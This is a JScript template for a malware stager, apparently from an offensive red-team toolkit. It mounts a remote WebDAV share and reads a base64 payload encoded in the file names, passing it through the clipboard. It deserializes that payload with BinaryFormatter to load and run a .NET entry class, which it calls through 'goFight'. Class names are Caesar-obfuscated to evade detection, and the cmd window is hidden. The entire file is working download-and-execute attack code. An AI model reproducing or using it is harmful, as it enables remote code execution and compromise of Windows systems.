var ${varWebDavServer} = ${funcInvertCaesar}(${caesarKey},"${webDavServer}");
var ${varEntryClass} = ${funcInvertCaesar}(${caesarKey},"${entryClass}");

try {
	var stm = Base64ToStream(LoadTemplates("\\\\" + ${varWebDavServer} + "\\serialized"))
	var fmt = new ActiveXObject(${funcInvertCaesar}(${caesarKey}, "${binaryFormatter}"));
	var al = new ActiveXObject(${funcInvertCaesar}(${caesarKey}, "${arrayList}"));

	var n = fmt.SurrogateSelector;
	var d = fmt.Deserialize_2(stm);
	al.Add(n);
	var o = d.DynamicInvoke(al.ToArray()).CreateInstance(${varEntryClass});
	o.goFight(${varWebDavServer});
} catch (e) {
    WScript.Echo(e.message);
}

//-----------------------------------------------------------------------------
function LoadTemplates(folder)
{
	var oSh = new ActiveXObject("WScript.Shell");
	var oHf = new ActiveXObject('htmlfile');
	
	// Download the chunks by mounting the WebDAV share and listing all files, then copy the result into the clipboard
	oSh.Run('cmd.exe /c "pushd ' + folder + ' & dir /b /a-d | clip.exe & popd"', 0, true);

	//-----------------------------------------------------------------------------
	// Retrieve result from the clipboard and sanitize input
	var result = oHf.parentWindow.clipboardData.getData('text');
	var regex = /(\n|\r)/g; result = result.replace(regex,"");
	regex = /_/g; result = result.replace(regex,"/");
	
	return result;
}

//-----------------------------------------------------------------------------
function ${funcInvertCaesar}(k, data)
{
    var n, s;
    var result = "";
    
    for (var i = 0; i < data.length; i++) {
        n = data.charCodeAt(i);
        s = n - k;
        if(s < 32 ) s = s + 94;
        result += String.fromCharCode(s);
    }
	
    return result;
}

//-----------------------------------------------------------------------------
function Base64ToStream(b) {
	var enc = new ActiveXObject("System.Text.ASCIIEncoding");
	var length = enc.GetByteCount_2(b);
	var ba = enc.GetBytes_4(b);
	var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
	ba = transform.TransformFinalBlock(ba, 0, length);
	var ms = new ActiveXObject(${funcInvertCaesar}(${caesarKey}, "${memoryStream}"));
	ms.Write(ba, 0, (length / 4) * 3);
	ms.Position = 0;
	return ms;
}
